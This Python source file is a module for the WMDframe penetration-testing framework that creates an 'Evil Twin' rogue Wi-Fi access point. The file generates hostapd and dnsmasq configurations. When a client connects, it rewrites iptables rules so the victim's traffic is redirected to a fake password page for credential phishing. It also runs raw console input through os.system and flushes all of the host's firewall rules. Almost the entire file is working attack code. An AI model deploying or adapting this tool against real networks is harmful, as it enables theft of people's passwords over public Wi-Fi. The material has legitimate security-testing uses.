#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
#
# Module for WMDframe
# This modules is creates access point which on clients
# connection will change iptables rules and deny access
# to the internet - but allow access to a phishing page.
#


import argparse
import os
import subprocess
import shlex
from time import sleep
try:
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc
except:
    # Running module outside the WMDframe might require path changing to import core modules
    import sys
    sys.path.append('././')
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc


# ==========================
# Parser START
# ==========================
parser = argparse.ArgumentParser()
# parser.add_argument('-ip', '--lanip', help='IP to monitor', metavar='IP') # Example. Use with "args.lanip"
parser.add_argument('-r', '--run', action='store_true', help='Start monitoring')
args, unknown = parser.parse_known_args()
# ==========================
# Parser END
# ==========================


# ==========================
# Core START
# ==========================
config = core.config()
INTERFACE_NET = (config['NETWORK']['INTERFACE_NET'])
INTERFACE_MON = (config['NETWORK']['INTERFACE_MON'])

logger = core.log()
# logger.debug('Starting module')
# ==========================
# Core END
# ==========================


# ==========================
# Log files, global variables, etc. START
# ==========================

# ==========================
# Log files, global variables, etc. end
# ==========================


# OPTIONS
class Options():
    """Main class for module."""

    Author = 'Thomas TJ (TTJ)'
    Name = 'Ewil Twin phishing'
    Call = 'etphis'
    Modulename = 'et_phishing'  # Filename
    Category = 'phishing'
    Type = 'ap'
    Version = '0.1'
    License = 'MIT'
    Description = 'Create a Evil Twin and redirect user to fake password page.'
    Datecreation = '2017/02/01'
    Lastmodified = '2017/02/01'

    def __init__(self, int_net, int_mon, webphis, ssid, channel):
        """Define variables and show options on run."""
        self.int_net = int_net
        self.int_mon = int_mon
        self.webphis = webphis
        self.ssid = ssid
        self.channel = channel
        self.show_all()

    def poss_opt(self):
        """Possible options. These variables are checked when the user tries to 'set' an option."""
        return ('int_net', 'int_mon', 'webphis', 'ssid', 'channel')

    def show_opt(self):
        """Show the possible options."""
        print(
            ''
            '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 8, 'RQ', 18, 'VALUE', 'DESCRIPTION')) + bc.ENDC +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 8, '--', 18, '-----', '-----------')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'int_net:', 8, 'y', 18, self.int_net, 'Interface with internet access')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'int_mon:', 8, 'n', 18, self.int_mon, 'Interface for creating AP')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'webphis:', 8, 'n', 18, self.webphis, 'IP for phising attack (checkout the module "webphis")')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'ssid:', 8, 'n', 18, self.ssid, 'AP name')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'channel:', 8, 'n', 18, self.channel, 'Channel for AP')) +
            '\n'
        )

    def show_commands(self):
        """Show the possible commands."""
        print(
            ''
            '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC +
            '\n\t' + '---------' +
            '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'set', 'Set options, set [PARAMETER] [VALUE]')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'invoke', 'Invoke module')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit')) +
            '\n'
        )

    def show_all(self):
        """Show all options.

        Sending main options to the core module modules.py for parsing.
        """
        cmodules.showModuleData(
            Options.Author,
            Options.Name,
            Options.Call,
            Options.Category,
            Options.Type,
            Options.Version,
            Options.Description,
            Options.License,
            Options.Datecreation,
            Options.Lastmodified
        )
        self.show_commands()
        self.show_opt()
# END OPTIONS


def run():
    """The main run function."""
    try:
        # kill instances of hostapd and dnsmasq
        cleanup_system()
        iptables_allow_access()

        # dnsmasq.conf
        dnsconf = ('interface=' + sop.int_mon + '\n')
        dnsconf += ('dhcp-range=10.0.0.10,10.0.0.250,12h' + '\n')
        dnsconf += ('dhcp-option=3,10.0.0.1' + '\n')
        dnsconf += ('dhcp-option=6,10.0.0.1' + '\n')
        dnsconf += ('server=8.8.8.8' + '\n')
        dnsconf += ('log-queries' + '\n')
        dnsconf += ('log-dhcp' + '\n')
        dnsconf += ('no-hosts' + '\n')
        dnsconf += ('no-resolv' + '\n')
        # dnsconf += ('address=/#/' + sop.webphis)
        with open('tmp/dnsmasq.conf', 'w') as file:
            file.write(dnsconf)

        # fakehosts.conf
        # fakehosts = '192.168.1.1 nonhttp.com'

        # hostapd.conf
        hostapd = ('interface=' + sop.int_mon + '\n')
        hostapd += ('driver=nl80211' + '\n')
        hostapd += ('ssid=' + sop.ssid + '\n')
        hostapd += ('channel=' + sop.channel + '\n')
        hostapd += ('logger_syslog=-1' + '\n')
        hostapd += ('logger_syslog_level=2' + '\n')
        with open('tmp/hostapd.conf', 'w') as file:
            file.write(hostapd)

        comm.runCommand('dnsmasq -C tmp/dnsmasq.conf -d', 'dnsmasq')
        comm.runCommand2('hostapd ./tmp/hostapd.conf', 'hostapd')

        print('   -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'phisAP:' + bc.ENDC + ' Press Ctrl+c to exit')

        check_connections()

        cleanup_system()
        cleanup_iptables()

    except KeyboardInterrupt:
        cleanup_system()
        cleanup_iptables()


def check_connections():
    """Checking for connected clients to access point."""
    checker = 0
    args_device = shlex.split('sudo iw dev ' + sop.int_mon + ' station dump')
    while True:
        try:
            device_info = subprocess.check_output(args_device).decode('ascii').split()
            connected_client = device_info[device_info.index('Station') + 1]
            if checker != 1:
                print('\t[!]  Client connected. Starting captive. Client: ' + connected_client)
                iptables_captive()
                checker = 1
        except:
            if checker == 1:
                print('\t[!]  Client disconnected. Going back to normal.')
                iptables_allow_access()
                checker = 0
            pass
        sleep(5)


def iptables_allow_access():
    """Cleaning up rules in iptables and allowing passthrough access."""
    cleanup_iptables()
    os.system('ifconfig ' + sop.int_mon + ' 10.0.0.1 up')
    os.system('sysctl -w net.ipv4.ip_forward=1')
    os.system('iptables -P FORWARD ACCEPT')
    os.system('iptables --table nat -A POSTROUTING -o ' + sop.int_net + ' -j MASQUERADE')


def iptables_captive():
    """Cleaning up rules in iptables and redirecting to phising."""
    cleanup_iptables()
    os.system('iptables -t mangle -N captiveportal')
    os.system('iptables -t mangle -A PREROUTING -i ' + sop.int_mon + ' -p udp --dport 53 -j RETURN')
    os.system('iptables -t mangle -A PREROUTING -i ' + sop.int_mon + ' -j captiveportal')
    os.system('iptables -t mangle -A captiveportal -j MARK --set-mark 1')
    os.system('iptables -t nat -A PREROUTING -i ' + sop.int_mon + '  -p tcp -m mark --mark 1 -j DNAT --to-destination ' + sop.webphis)
    os.system('sysctl -w net.ipv4.ip_forward=1')
    os.system('iptables -A FORWARD -i ' + sop.int_mon + ' -j ACCEPT')
    os.system('iptables -t nat -A POSTROUTING -o ' + sop.int_net + ' -j MASQUERADE')


def cleanup_system():
    """Clean iptables after use."""
    os.system('killall dnsmasq')
    os.system('killall hostapd')
    try:
        os.remove('tmp/dnsmasq.conf')
    except:
        pass
    try:
        os.remove('tmp/hostapd.conf')
    except:
        pass


def cleanup_iptables():
    """Cleaning up rules in iptables."""
    os.system('iptables -P INPUT ACCEPT')
    os.system('iptables -P FORWARD ACCEPT')
    os.system('iptables -P OUTPUT ACCEPT')
    os.system('iptables -t nat -P PREROUTING ACCEPT')
    os.system('iptables -t nat -P POSTROUTING ACCEPT')
    os.system('iptables -t nat -P OUTPUT ACCEPT')
    os.system('iptables -t mangle -P PREROUTING ACCEPT')
    os.system('iptables -t mangle -P OUTPUT ACCEPT')
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('iptables -t mangle -F')
    os.system('iptables -t mangle -X')


# OPTIONAL
def info():
    """Show the modules info - optional."""
    print("""
        Module for use in WMDframe.

        Use the module "wifiutils" to gather info about access points.
        Then use this tool to create a evil twin and redirect them
        to your phishing site.
        """)
    # Delete the parser info, if args.parse is not used.
    if parser.format_help():
        print('\n\t' + bc.OKBLUE + 'COMMANDLINE ARGUMENTS:' + bc.ENDC)
        for line in parser.format_help().strip().splitlines():
            print('\t' + line)
    print('')


# CONSOLE
def console():
    """The main console for the module."""
    value = input('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'phisAP:' + bc.ENDC + ' ')
    userinput = value.split()
    # Show options
    if 'so' in userinput[:1]:
        sop.show_opt()
    # Show all info
    elif 'sa' in userinput[:1]:
        sop.show_all()
    # Run module
    elif 'run' in userinput[:1]:
        run()
    # Set options
    elif 'set' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')  # The parameter to set
        uservalue = str(userinput[2:3]).strip('[]\'')  # Use single word after "set parameter" to set parameter
        # uservalue = value.split(' ', 2)[2]  # Use all text after "set parameter"
        if useroption not in sop.poss_opt():
            print(bc.WARN + '\n    Error, no options for: ' + useroption + '\n' + bc.ENDC)
        elif useroption in sop.poss_opt():
            setattr(sop, useroption, uservalue)
            print('\n      ' + useroption + '\t> ' + uservalue + '\n')
    # Open module in new window
    elif 'invoke' in userinput[:1]:
        comm.invokeModule(Options.Call)
        return None
    # Go back to WMDframe console
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    # Run command
    elif ':' in userinput[:1]:
        print('')
        os.system(str(value[1:]))
        print('')
    # Show info
    elif 'info' in userinput[:1]:
        info()
    else:
        command = str(userinput[:1]).strip('[]\'')
        print(bc.WARN + '\n    Error, no options for: ' + command + '\n' + bc.ENDC)
    console()
# END console


def main():
    """The first function to run."""
    print('\n')
    print('\t    ___    ____           __    _      __    _              ')
    print('\t   /   |  / __ \   ____  / /_  (_)____/ /_  (_)___  ____ _  ')
    print('\t  / /| | / /_/ /  / __ \/ __ \/ / ___/ __ \/ / __ \/ __ `/  ')
    print('\t / ___ |/ ____/  / /_/ / / / / (__  ) / / / / / / / /_/ /   ')
    print('\t/_/  |_/_/      / .___/_/ /_/_/____/_/ /_/_/_/ /_/\__, /    ')
    print('\t               /_/                               /____/     ')
    print('\n')
    if os.getuid() != 0:
        print('r00tness is needed due to XXX!')
        print('Run the script again as root/sudo')
        return None
    # print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    # comm.checkNetConnectionV()
    print('')
    global sop
    # The parameters to be passed to the module on run
    sop = Options(INTERFACE_NET, INTERFACE_MON, '192.168.1.1', 'FREEWIFI', '1')
    if args.run:
        run()
    else:
        console()


if args.run:
    main()


# For testing uncomment "main()", place module in root directory and run module with "python3 modulename.py"
# main()
